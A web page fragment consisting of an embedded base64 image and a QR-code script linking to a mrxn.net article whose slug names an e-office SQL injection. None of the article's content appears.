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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-webservice-json-sms-wsdl-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 